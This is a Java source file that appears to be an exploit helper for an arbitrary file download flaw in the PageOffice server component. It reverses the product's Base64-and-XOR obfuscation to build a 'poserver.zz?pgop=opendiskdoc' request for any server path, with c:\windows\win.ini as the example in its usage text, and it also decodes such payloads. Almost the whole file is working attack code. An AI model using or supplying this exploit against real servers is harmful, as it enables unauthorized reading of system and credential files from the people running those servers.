import java.util.Base64;

public class Main {
    private static String Encode(String paramString) {
        byte[] arrayOfByte1;
        byte[] arrayOfByte2 = new byte[(arrayOfByte1 = paramString.getBytes()).length];
        for (byte b = 0; b < arrayOfByte1.length; b++) {
            if (b % 2 != 0) {
                arrayOfByte2[b] = (byte)(arrayOfByte1[b] - 2);
            } else {
                arrayOfByte2[b] = (byte)(arrayOfByte1[b] - 3 ^ 0x49);
            }
        }
        String str;
        return str = Base64.getEncoder().encodeToString(arrayOfByte2);
    }
    private static String Decode(String paramString) {
        byte[] arrayOfByte1;
        try {
            arrayOfByte1 = Base64.getDecoder().decode(paramString);
        } catch (Exception exception) {
            return "";
        }
        byte[] arrayOfByte2 = new byte[arrayOfByte1.length];
        for (byte b = 0; b < arrayOfByte1.length; b++) {
            if (b % 2 != 0) {
                arrayOfByte2[b] = (byte)(arrayOfByte1[b] + 2);
            } else {
                arrayOfByte2[b] = (byte)((arrayOfByte1[b] ^ 0x49) + 3);
            }
        }
        String str;
        return str = new String(arrayOfByte2);
    }
    public static void main(String[] args) {
        try {
            String arg1 = args[0];
            String arg2 = args[1];
            if (arg1.equals("encode")) {
                String payload = "file=" + arg2 + "&filename=1.txt&contenttype=application/octet-stream";
                System.out.println("\nencode payload: \n" + "poserver.zz?pgop=opendiskdoc&id="+Encode(payload) + "\n");
            } else {
                System.out.println("\ndecode payload: \n" + Decode(arg2) + "\n");
            }
        } catch (Exception e){
            System.out.println("\nUsage: java -jar PageOffice-FileDownload.jar encode(decode) c:\\windows\\win.ini" +
                    "\n");
        }
    }
}